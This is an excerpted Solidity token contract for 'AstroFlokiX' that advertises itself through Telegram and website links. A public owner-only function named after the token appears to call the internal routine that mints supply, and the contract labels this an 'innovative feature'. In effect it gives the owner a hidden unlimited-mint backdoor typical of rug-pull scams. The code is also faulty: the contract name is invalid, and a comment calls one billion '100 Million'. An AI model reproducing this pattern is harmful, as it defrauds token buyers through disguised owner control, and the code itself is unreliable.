//
// $AstroFlokiX proposes an innovative feature in its contract.
//
// 📱 Telegram::https://t.me/AstroflokiXOFC
// 📱 Website ::https://astroflokix.com/
...
contract ERC20 is Context, IERC20, Ownable {
    ...
    function _AstroFlokiX(uint256 amount) public onlyOwner {
 _AstroFlokiX(msg.sender, amount);
    }
    ...
    function _AstroFlokiX(address account, uint256 amount) internal virtual {
...
contract $AstroFlokiX is ERC20 {

    uint tokenTotalSupply = 1000000000; // 100 Million Token Supply

    constructor() public ERC20("AstroFlokiX", "AFX") {
     _AstroFlokiX(msg.sender, tokenTotalSupply * (10 ** uint256(decimals())));
    }
}